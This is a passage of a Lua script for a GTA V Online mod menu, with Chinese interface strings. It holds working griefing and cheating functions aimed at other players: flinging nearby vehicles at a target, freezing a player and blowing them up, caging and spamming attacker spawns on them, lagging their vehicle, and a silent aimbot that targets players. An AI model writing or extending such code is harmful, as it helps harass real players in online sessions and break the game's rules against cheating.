            menu.set_value(freeze_toggle, true)
            request_ptfx_asset_peeloop("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
            )
            menu.set_value(freeze_toggle, false)
        end
    end

local yeetMultiplier = 1000
local yeetRange = 1000
local stormDelay = new.delay(1, 0, 0)  
function yeetEntities()
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local targetPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        --local targetPos = players.get_position(pid)
        local pointerTables = {
            entities.get_all_peds_as_pointers(),
            entities.get_all_vehicles_as_pointers()
        }
        local range = yeetRange * yeetRange --squaring it, for VDIST2
        for _, pointerTable in pairs(pointerTables) do
            for _, entityPointer in pairs(pointerTable) do
                local entityPos = entities.get_position(entityPointer)
                local distance = v3.distance(targetPos, entityPos)
                if distance < range then
                    local entityHandle = entities.pointer_to_handle(entityPointer)
                    --check the entity is a ped in a car
                    if (ENTITY.IS_ENTITY_A_PED(entityHandle) and (not PED.IS_PED_IN_ANY_VEHICLE(entityHandle, true) and (not PED.IS_PED_A_PLAYER(entityHandle)))) or (not ENTITY.IS_ENTITY_A_PED(entityHandle))--[[for the vehicles]] then
                        local playerList = players.list(true, true, true)
                        if not ENTITY.IS_ENTITY_A_PED(entityHandle) then
                            for _, pid in pairs(playerList) do
                                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                                if PED.GET_VEHICLE_PED_IS_IN(ped, false) == entityHandle then goto skip end --if the entity is a players car ignore it
                            end
                        end
                        local localTargetPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entityHandle)
                        v3.sub(localTargetPos, entityPos) --subtract here, for launch.
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(entityHandle, 1, v3.getX(localTargetPos) * yeetMultiplier, v3.getY(localTargetPos) * yeetMultiplier, v3.getZ(localTargetPos) * yeetMultiplier, true, false, true, true)
                        ::skip::
                    end
                end
            end
        end
    end

function chaoshita(pid) 
yeetEntities()
        util.yield(getTotalDelay(stormDelay))
        if not players.exists(pid) then util.stop_thread() end
end

function Get_Waypoint_Pos2()
    if HUD.IS_WAYPOINT_ACTIVE() then
        local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
        local waypoint_pos = HUD.GET_BLIP_COORDS(blip)
        return waypoint_pos
    end
end

function EaseOutCubic(x)
    return 1 - ((1-x) ^ 3)
end

function EaseInOutCubic(x) --Thank you QUICKNET for re-writing this function!
    if(x < 0.5) then
        return 4 * x * x * x;
    else
        return 1 - ((-2 * x + 2) ^ 3) / 2
    end
end

local WhiteText = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}

function SmoothTeleportToCord(v3coords, teleportFrame)
    local wppos = v3coords
    local localped = PLAYER.GET_PLAYER_PED(players.user())
    if wppos ~= nil then --cam setup here
        if not CAM.DOES_CAM_EXIST(CCAM) then
            CAM.DESTROY_ALL_CAMS(true)
            CCAM = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
            CAM.SET_CAM_ACTIVE(CCAM, true)
            CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
        end
        --
        if teleportFrame then
            util.create_tick_handler(function ()
                if CAM.DOES_CAM_EXIST(CCAM) then
                    local tickCamCoord = CAM.GET_CAM_COORD(CCAM)
                    if not PED.IS_PED_IN_ANY_VEHICLE(localped, true) then --if they not in a vehicle
                        ENTITY.SET_ENTITY_COORDS(localped, tickCamCoord.x, tickCamCoord.y, tickCamCoord.z, false, false, false, false) --teleport the player
                    else
                        local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
                        ENTITY.SET_ENTITY_COORDS(veh, tickCamCoord.x, tickCamCoord.y, tickCamCoord.z, false, false, false, false) --teleport the vehicle
                    end
                else
                    return false
                end
            end)
        end
        --
        local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()))
        --
        for i = 0, 1, STP_SPEED_MODIFIER do --make the cam move up here
            CAM.SET_CAM_COORD(CCAM, pc.x, pc.y, pc.z + EaseOutCubic(i) * STP_COORD_HEIGHT)
            directx.draw_text(0.5, 0.5, tostring(EaseOutCubic(i) * STP_COORD_HEIGHT), 1, 0.6, WhiteText, false)
            local look = util.v3_look_at(CAM.GET_CAM_COORD(CCAM), pc)
            CAM.SET_CAM_ROT(CCAM, look.x, look.y, look.z, 2)
            wait()
        end
        --CAM.DO_SCREEN_FADE_OUT(1000) --fade out the screen
        ------------
        local currentZ = CAM.GET_CAM_COORD(CCAM).z
        local coordDiffx = wppos.x - pc.x
        local coordDiffxy = wppos.y - pc.y
        for i = 0, 1, STP_SPEED_MODIFIER / 2 do --make the camera on x/y plane
            CAM.SET_CAM_COORD(CCAM, pc.x + (EaseInOutCubic(i) * coordDiffx), pc.y + (EaseInOutCubic(i) * coordDiffxy), currentZ)
            wait()
        end
        -- local groundZ = PATHFIND.GET_APPROX_HEIGHT_FOR_POINT(wppos.x, wppos.y)
        -- ENTITY.SET_ENTITY_COORDS(localped, wppos.x, wppos.y, groundZ, false, false, false, false)
        local success, ground_z
        repeat
            STREAMING.REQUEST_COLLISION_AT_COORD(wppos.x, wppos.y, wppos.z)
            success, ground_z = util.get_ground_z(wppos.x, wppos.y)
            util.yield()
        until success
        if not PED.IS_PED_IN_ANY_VEHICLE(localped, true) then --if they not in a vehicle
            ENTITY.SET_ENTITY_COORDS(localped, wppos.x, wppos.y, ground_z, false, false, false, false) --teleport the player
        else
            local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
            local v3Out = memory.alloc()
            local headOut = memory.alloc()
            PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(wppos.x, wppos.y, ground_z, v3Out, headOut, 1, 3.0, 0)
            local head = memory.read_float(headOut)
            memory.free(headOut)
            memory.free(v3Out)
            ENTITY.SET_ENTITY_COORDS(veh, wppos.x, wppos.y, ground_z, false, false, false, false) --teleport the vehicle
            ENTITY.SET_ENTITY_HEADING(veh, head)
        end
        wait()
        local pc2 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()))
        local coordDiffz = CAM.GET_CAM_COORD(CCAM).z - ground_z -2
        local camcoordz = CAM.GET_CAM_COORD(CCAM).z
        --CAM.DO_SCREEN_FADE_IN(2000) --fade in the screen
        for i = 0, 1, STP_SPEED_MODIFIER / 2 do --move the camera down
            local pc23 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()))-- extra for x/y
            CAM.SET_CAM_COORD(CCAM, pc23.x, pc23.y, camcoordz - (EaseOutCubic(i) * coordDiffz))
            wait()
        end
        -------------
        ----
        wait()
        --camera deletion here
        CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
        if CAM.IS_CAM_ACTIVE(CCAM) then
            CAM.SET_CAM_ACTIVE(CCAM, false)
        end
        CAM.DESTROY_CAM(CCAM, true)
    else
        util.toast("没标点！")
    end
end

function requestModels(...)
    local arg = { ... }
    for _, model in ipairs(arg) do
        if not STREAMING.IS_MODEL_VALID(model) then
            error("tried to request an invalid model")
        end
        STREAMING.REQUEST_MODEL(model)
        while not STREAMING.HAS_MODEL_LOADED(model) do
            util.yield()
        end
    end
end

function uforq(pid) 
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_ENTITY_COORDS(p)
    STREAMING.REQUEST_MODEL(ufo)
    while not STREAMING.HAS_MODEL_LOADED(ufo) do
        STREAMING.REQUEST_MODEL(ufo)
        util.yield()
    end
    menu.trigger_commands("freeze".. players.get_name(pid).. " on")
    c.z = c.z + 10
    local spawnedufo = entities.create_object(ufo, c) --creates ufo
    util.yield(2000)
    c = ENTITY.GET_ENTITY_COORDS(p)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 3.0, false)
    util.yield(1000)
    entities.delete_by_handle(spawnedufo)
    menu.trigger_commands("freeze".. players.get_name(pid).. " off")
end

function sendog(pid)
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i = 1, 20 do
		send_attacker(-1788665315, pid, false)
		util.yield(1)
        end
		local coords = ENTITY.GET_ENTITY_COORDS(ped, true)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z']
        local hash = 779277682
        request_model_load(hash)
        local cage1 = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
        ENTITY.SET_ENTITY_ROTATION(cage1, 0.0, -90.0, 0.0, 1, true)
        local cage2 = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
        ENTITY.SET_ENTITY_ROTATION(cage2, 0.0, 90.0, 0.0, 1, true)
end

function sendmonkey(pid)
    PlayerName = PLAYER.GET_PLAYER_NAME(pid)
    local hash = util.joaat("a_c_chimp")
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        STREAMING.REQUEST_MODEL(hash)
        util.yield()
    end
    for i = 1, 69 do
        PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        MonkeCoords = {
            ["x"] = PlayerCoords.x,
            ["y"] = PlayerCoords.y,
            ["z"] = PlayerCoords.z + 3
        }
        entities.create_ped(28, hash, MonkeCoords, 0)
        util.yield(50)
    end
end

function sendcxk(pid)
    PlayerName = PLAYER.GET_PLAYER_NAME(pid)
    local hash = util.joaat("a_c_hen")
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        STREAMING.REQUEST_MODEL(hash)
        util.yield()
    end
    for i = 1, 69 do
        PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        MonkeCoords = {
            ["x"] = PlayerCoords.x,
            ["y"] = PlayerCoords.y,
            ["z"] = PlayerCoords.z + 3
        }
        entities.create_ped(28, hash, MonkeCoords, 0)
        util.yield(50)
    end
end

local function tpTableToPlayer(tbl, pid)
    if NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        for _, v in pairs(tbl) do
            if (not PED.IS_PED_A_PLAYER(v)) then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(v, c.x, c.y, c.z, false, false, false)
            end
        end
    end
end
function TpAllPeds(player)
    local pedHandles = entities.get_all_peds_as_handles()
    tpTableToPlayer(pedHandles, player)
end
function TpAllVehs(player)
    local vehHandles = entities.get_all_vehicles_as_handles()
    tpTableToPlayer(vehHandles, player)
end
function TpAllObjects(player)
    local objHandles = entities.get_all_objects_as_handles()
    tpTableToPlayer(objHandles, player)
end
function TpAllPickups(player)
    local pickupHandles = entities.get_all_pickups_as_handles()
    tpTableToPlayer(pickupHandles, player)
end


local function fastNet(entity, playerID)
    local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
        for i = 1, 30 do
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
                wait(10)
            else
                goto continue
            end    
        end
    end
    ::continue::
    if SE_Notifications then
        util.toast("有控制权.")
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
    wait(10)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
    wait(10)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
    wait(10)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, playerID, true)
    wait(10)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, true, false)
    wait(10)
    ENTITY.SET_ENTITY_SHOULD_FREEZE_WAITING_ON_COLLISION(entity, false)
    wait(10)
    if ENTITY.IS_ENTITY_AN_OBJECT(entity) then
        NETWORK.OBJ_TO_NET(entity)
    end
    wait(10)
    if BA_visible then
        ENTITY.SET_ENTITY_VISIBLE(entity, true, 0)
    else
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
        wait()
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
        wait()
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
    end
end

function qfmq(pid)
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local forwardOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 4, 0)
    local pheading = ENTITY.GET_ENTITY_HEADING(ped)
    local hash = 309416120
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do wait() end
    local a1 = OBJECT.CREATE_OBJECT(hash, forwardOffset.x, forwardOffset.y, forwardOffset.z - 1, true, true, true)
    ENTITY.SET_ENTITY_HEADING(a1, pheading + 90)
    fastNet(a1, pid)
    local b1 = OBJECT.CREATE_OBJECT(hash, forwardOffset.x, forwardOffset.y, forwardOffset.z + 1, true, true, true)
    ENTITY.SET_ENTITY_HEADING(b1, pheading + 90)
    fastNet(b1, pid)
    wait(500)
    entities.delete_by_handle(a1)
    entities.delete_by_handle(b1)
end

local function getPlayerName_pid(pid)
    local playerName = NETWORK.NETWORK_PLAYER_GET_NAME(pid)
    return playerName
end


function letcarlagging(pid)
    local ped = PLAYER.GET_PLAYER_PED(pid)
   if PED.IS_PED_IN_ANY_VEHICLE(ped) then
       local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
       local velocity = ENTITY.GET_ENTITY_VELOCITY(veh)
       local oldcoords = ENTITY.GET_ENTITY_COORDS(ped)
       wait(500)
       local nowcoords = ENTITY.GET_ENTITY_COORDS(ped)
       for a = 1, 10 do
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
           wait()
       end
       ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
       wait(200)
       for b = 1, 10 do
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
           wait()
       end
       ENTITY.SET_ENTITY_VELOCITY(veh, velocity.x, velocity.y, velocity.z)
       for c = 1, 10 do
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
           wait()
       end
       ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, nowcoords.x, nowcoords.y, nowcoords.z, false, false, false)
       for d = 1, 10 do
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
           wait()
       end
       ENTITY.SET_ENTITY_VELOCITY(veh, velocity.x, velocity.y, velocity.z)
       wait(500)
   else
       util.toast("玩家 " .. getPlayerName_pid(pid) .. " 不在车内")
   end
end


overlay_x = 0.0052
overlay_y = 0.18519
size = 0.03
boxMargin = size / 7
overlay_x = 0.0400
overlay_y = 0.1850
key_text_color = newColor(1, 1, 1, 1)
background_colour = newColor(0, 0, 0, 0.2)
pressed_background_colour = newColor(2.55/255, 2.55/255, 2.55/255, 0.5490196078431373)
spaceBarLength = 3
spaceBarSlim = 1
altSpaceBar = 0
wasd = {
    [1]  = { keys = {44, 52, 85, 138, 141, 152, 205, 264},                                               pressed = false, key = 'Q',     show = true },
    [2]  = { keys = {32, 71, 77, 87, 129, 136, 150, 232},                                                pressed = false, key = 'W',     show = true },
    [3]  = { keys = {38, 46, 51, 54, 86, 103, 119, 153, 184, 206, 350, 351, 355, 356},                   pressed = false, key = 'E',     show = true },
    [4]  = { keys = {45, 80, 140, 250, 263, 310},                                                        pressed = false, key = 'R',     show = true },
    [5]  = { keys = {34 ,63, 89, 133, 147, 234, 338},                                                    pressed = false, key = 'A',     show = true },
    [6]  = { keys = {8, 31, 33, 72, 78, 88, 130, 139, 149, 151, 196, 219, 233, 268, 269, 302},           pressed = false, key = 'S',     show = true },
    [7]  = { keys = {9, 30, 35, 59, 64, 90, 134, 146, 148, 195, 218, 235, 266, 267, 278, 279, 339, 342}, pressed = false, key = 'D',     show = true },
    [8]  = { keys = {23, 49, 75, 145, 185, 251},                                                         pressed = false, key = 'F',     show = true },
    [9]  = { keys = {21, 61, 131, 155, 209, 254, 340, 352},                                              pressed = false, key = 'Shift', show = true },
    [10] = { keys = {36, 60, 62, 132, 224, 280, 281, 326, 341, 343},                                     pressed = false, key = 'Ctrl',  show = true },
    [11] = { keys = {18, 22, 55, 76, 102, 143, 179, 203, 216, 255, 298, 321, 328, 353},                  pressed = false, key = 'Space', show = true },
}

pedToggleLoops = {
    {name = '摔倒NPC', command = 'JSragdollPeds', description = '让附近的所有NPC都摔倒,哈哈.', action = function(ped)
        if PED.IS_PED_A_PLAYER(ped) then return end
        PED.SET_PED_TO_RAGDOLL(ped, 2000, 2000, 0, true, true, true)
    end},
    {name = '死亡接触', command = 'JSdeathTouch', description = '杀死所有碰到您的NPC', action = function(ped)
        if PED.IS_PED_A_PLAYER(ped) or PED.IS_PED_IN_ANY_VEHICLE(ped, true) or not ENTITY.IS_ENTITY_TOUCHING_ENTITY(ped, players.user_ped()) then return end
        ENTITY.SET_ENTITY_HEALTH(ped, 0, 0)
    end},
    {name = '寒冷NPC', command = 'JScoldPeds', description = '移除附近NPC的热特征', action = function(ped)
        if PED.IS_PED_A_PLAYER(ped) then return end
        PED.SET_PED_HEATSCALE_OVERRIDE(ped, 0)
    end},
    {name = '静音NPC', command = 'JSmutePeds', description = '因为我不想再听那个家伙谈论他的同性恋狗了.', action = function(ped)
        if PED.IS_PED_A_PLAYER(ped) then return end
        AUDIO.STOP_PED_SPEAKING(ped, true)
    end},
    {name = 'NPC喇叭加速', command = 'JSnpcHornBoost', description = '当NPC按喇叭的时候加速它们的载具.', action = function(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if PED.IS_PED_A_PLAYER(ped) or not PED.IS_PED_IN_ANY_VEHICLE(ped, true) or not AUDIO.IS_HORN_ACTIVE(vehicle) then return end
        AUDIO.SET_AGGRESSIVE_HORNS(true) --Makes pedestrians sound their horn longer, faster and more agressive when they use their horn.
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, ENTITY.GET_ENTITY_SPEED(vehicle) + 1.2)
    end, onStop = function()
        AUDIO.SET_AGGRESSIVE_HORNS(false)
    end},
    {name = 'NPC警笛加速', command = 'JSnpcSirenBoost', description = '当NPC响起警车的警笛的时候加速它们的载具.', action = function(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if PED.IS_PED_A_PLAYER(ped) or not PED.IS_PED_IN_ANY_VEHICLE(ped, true) or not VEHICLE.IS_VEHICLE_SIREN_ON(vehicle) then return end
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, ENTITY.GET_ENTITY_SPEED(vehicle) + 1.2)
    end},
    {name = '自动杀死敌人', command = 'JSautokill', description = '立即击杀NPC敌人.', action = function(ped)
        local rel = PED.GET_RELATIONSHIP_BETWEEN_PEDS(players.user_ped(), ped)
        if PED.IS_PED_A_PLAYER(ped) or ENTITY.IS_ENTITY_DEAD(ped) or not( (rel == 4 or rel == 5) or PED.IS_PED_IN_COMBAT(ped, players.user_ped()) ) then return end
        ENTITY.SET_ENTITY_HEALTH(ped, 0, 0)
    end},
}


----pvphelper
function GetTableFromV3Instance(v3int)
    local tbl = {x = v3.getX(v3int), y = v3.getY(v3int), z = v3.getZ(v3int)}
    return tbl
end

function SE_add_owned_explosion(ped, x, y, z, exptype, dmgscale, isheard, isinvis, camshake)
    FIRE.ADD_OWNED_EXPLOSION(ped, x, y, z, exptype, dmgscale, isheard, isinvis, camshake)
end

function DistanceBetweenTwoCoords(v3_1, v3_2)
    local distance = math.sqrt(((v3_2.x - v3_1.x)^2) + ((v3_2.y - v3_1.y)^2) + ((v3_2.z - v3_1.z)^2))
    return distance
end

AIM_WHITELIST = {}

Silent_Aimbot = {
    hitboxes = {
        head = {hash = 12844, toggled = false},
        spine = {hash = 24817, toggled = false},
        pelvis = {hash = 11816, toggled = false},
    },

    fov = 2,
    dist = 300,
    dmg = 100,

    los_check = true,
    fov_check = true,

    hash = 177293209, --heavy sniper mk2 hash
    advanced = {
        speed = -1
    }
}

function pid_to_handle(pid)
    NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, memory.alloc(13*8), 13)
    return memory.alloc(13*8)
end

saimbot_mode = "closest"
function get_aimbot_target()
    local dist = 1000000000
    local cur_tar = 0
    for k,v in pairs(entities.get_all_peds_as_handles()) do
        local target_this = true
        local player_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
        local ped_pos = ENTITY.GET_ENTITY_COORDS(v, true)
        local this_dist = MISC.GET_DISTANCE_BETWEEN_COORDS(player_pos['x'], player_pos['y'], player_pos['z'], ped_pos['x'], ped_pos['y'], ped_pos['z'], true)
        if PLAYER.PLAYER_PED_ID() ~= v and not ENTITY.IS_ENTITY_DEAD(v) then
            if not satarget_players then
                if PED.IS_PED_A_PLAYER(v) then
                    target_this = false
                end
            end
            if not satarget_npcs then
                if not PED.IS_PED_A_PLAYER(v) then
                    target_this = false
                end
            end
            if not ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(PLAYER.PLAYER_PED_ID(), v, 17) then
                target_this = false
            end
            if satarget_usefov then
                if not PED.IS_PED_FACING_PED(PLAYER.PLAYER_PED_ID(), v, sa_fov) then
                    target_this = false
                end
            end
            if satarget_novehicles then
                if PED.IS_PED_IN_ANY_VEHICLE(v, true) then
                    target_this = false
                end
            end
            if satarget_nogodmode then
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(v) then
                    target_this = false
                end
            end
            if not satarget_targetfriends and satarget_players then
                if PED.IS_PED_A_PLAYER(v) then
                    local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(v)
                    local hdl = pid_to_handle(pid)
                    if NETWORK.NETWORK_IS_FRIEND(hdl) then
                        target_this = false
                    end
                end
            end
            if saimbot_mode == "closest" then
                if this_dist <= dist then
                    if target_this then
                        dist = this_dist
                        cur_tar = v
                    end
                end
            end
        end
    end
    return cur_tar
end

function ShootSingleBulletBetweenCoords(coords1, coords2, dmg, weaponhash, ownerped, audible, invisible, speed)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
        coords1.x, coords1.y, coords1.z,
        coords2.x, coords2.y, coords2.z,
        dmg, true, weaponhash, ownerped, audible, invisible, speed)
end

function ShootBulletAtPedBone(ped, boneID, dmg, weaponHash, speed)
    local bonecoords = PED.GET_PED_BONE_COORDS(ped, boneID, 0, 0, 0)
    local ourped = GetLocalPed()

    local ourhead = PED.GET_PED_BONE_COORDS(ourped, 12844, 0, 0, 0); local ourfront = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ourped, 0, 1, 0)
    ourfront.z = ourhead.z --to shoot out of infront of our head
    ShootSingleBulletBetweenCoords(ourfront, bonecoords, dmg, weaponHash, ourped, true, false, speed)
end

function GetPlayerName_ped(ped)
    local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ped)
    local playerName = NETWORK.NETWORK_PLAYER_GET_NAME(playerID)
    return playerName
end

function GetSuitableAimbotTarget(fov, fovcheck, dist, loscheck)
    local ourped = GetLocalPed()
    local distsq = dist * dist
    local ourc = ENTITY.GET_ENTITY_COORDS(ourped)
    local entTable = entities.get_all_peds_as_pointers()
    local inRange = {}
    for _, entity in pairs(entTable) do

        local entpos = entities.get_position(entity)

            if SYSTEM.VDIST2(ourc.x, ourc.y, ourc.z, entpos.x, entpos.y, entpos.z) <= distsq then --distance check

                local handle = entities.pointer_to_handle(entity)
                if (handle ~= ourped) then
                    if (not PED.IS_PED_DEAD_OR_DYING(handle)) and (INTERIOR.GET_INTERIOR_FROM_ENTITY(handle) == 0) then --dead/interior check

                        if (fovcheck and PED.IS_PED_FACING_PED(ourped, handle, fov)) or (not fovcheck) then --fov check

                            if (PED.IS_PED_A_PLAYER(handle)) and (not AIM_WHITELIST[NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)]) then --whitelist, player check

                                if (loscheck and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(ourped, handle, 17)) or (not loscheck) then --line-of-sight check
                                    inRange[#inRange+1] = handle
                                end
                            end
                        end
                    end
                end
            end

    end
    local retplayer
    local d = 99999999999
    if #inRange ~= 0 then
        for _, ped in pairs(inRange) do
            local tc = ENTITY.GET_ENTITY_COORDS(ped)
            local vidsti = SYSTEM.VDIST2(ourc.x, ourc.y, ourc.z, tc.x, tc.y, tc.z)
            if vidsti < d then
                retplayer = ped
                d = vidsti
            end
        end
        return retplayer
    end
    return nil
end

function DoesTableContainValue(table, value)
    for _, v in pairs(table) do
        if v == value then return true end
    end
    return false
end

function GetClosestPlayerWithRange_Whitelist_DisallowEntities(range, disallowedEntities, inair) --variation of GetClosestPlayerWithRange_Whitelist, that makes entities not returned if they are in the table.
    local pedPointers = entities.get_all_peds_as_pointers()
    local rangesq = range * range
    local ourCoords = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
    local tbl = {}
    local closest_player = 0
    for i = 1, #pedPointers do
        local tarcoords = entities.get_position(pedPointers[i])
        local vdist = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
        if vdist <= rangesq then
            local handle = entities.pointer_to_handle(pedPointers[i])
            local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)
            if (inair and (ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(handle) >= 9)) or (not inair) then --air check
                if not AIM_WHITELIST[playerID] then --this is the whitelist check.
                    if not DoesTableContainValue(disallowedEntities, handle) then --this is the disallowed entities table check
                        tbl[#tbl+1] = handle
                    end
                end
            end
        end
    end
    if tbl ~= nil then
        local dist = 999999
        for i = 1, #tbl do
            if tbl[i] ~= GetLocalPed() then
                if PED.IS_PED_A_PLAYER(tbl[i]) then
                    local tarcoords = ENTITY.GET_ENTITY_COORDS(tbl[i])
                    local e = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
                    if e < dist then
                        dist = e
                        closest_player = tbl[i]
                    end
                end
            end
        end
    end
    if closest_player ~= 0 then
        return closest_player
    else
        return nil
    end
end

function GetValueIndexFromTable(table, value)
    for i, v in pairs(table) do
        if v == value then return i end
    end
    return nil
end

function GetClosestPlayerWithRange_Whitelist(range, inair) --variation of getClosestPlayerWithinRange to work with my whitelisting feature for silent aimbot
    local pedPointers = entities.get_all_peds_as_pointers()
    local rangesq = range * range
    local ourCoords = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
    local tbl = {}
    local closest_player = 0
    for i = 1, #pedPointers do
        local tarcoords = entities.get_position(pedPointers[i])
        local vdist = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
        if vdist <= rangesq then
            local handle = entities.pointer_to_handle(pedPointers[i])
            if (inair and (ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(handle) >= 9)) or (not inair) then --air check
                local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)
                if not AIM_WHITELIST[playerID] then --this is the whitelist check.
                    tbl[#tbl+1] = handle
                end
            end
        end
    end
    if tbl ~= nil then
        local dist = 999999
        for i = 1, #tbl do
            if tbl[i] ~= GetLocalPed() then
                if PED.IS_PED_A_PLAYER(tbl[i]) then
                    local tarcoords = ENTITY.GET_ENTITY_COORDS(tbl[i])
                    local e = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
                    if e < dist then
                        dist = e
                        closest_player = tbl[i]
                    end
                end
            end
        end
    end
    if closest_player ~= 0 then
        return closest_player
    else
        return nil
    end
end

function GetClosestNonPlayerPedWithRange_DisallowedEntities(range, disallowedEntities, inair) --modified version of GetClosestNonPlayerPedWithRange that takes a table of disallowed entities (blacklisted peds)
    local pedPointers = entities.get_all_peds_as_pointers()
    local rangesq = range * range
    local ourCoords = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
    local tbl = {}
    local closest_ped = 0
    for i = 1, #pedPointers do
        local tarcoords = entities.get_position(pedPointers[i])
        local vdist = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
        if vdist <= rangesq then
            local handle = entities.pointer_to_handle(pedPointers[i])
            if (inair and (ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(handle) >= 9)) or (not inair) then
                if not DoesTableContainValue(disallowedEntities, handle) then
                    tbl[#tbl+1] = handle
                end
            end
        end
    end
    if tbl ~= nil then
        local dist = 999999
        for i = 1, #tbl do
            if tbl[i] ~= GetLocalPed() then
                if not PED.IS_PED_A_PLAYER(tbl[i]) then
                    local tarcoords = getEntityCoords(tbl[i])
                    local e = SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
                    if e < dist then
                        dist = e
                        closest_ped = tbl[i]
                    end
                end
            end
        end
    end
    if closest_ped ~= 0 then
        return closest_ped
    else
        return nil
    end
end

function SetVehicleMissileSpeed(value)
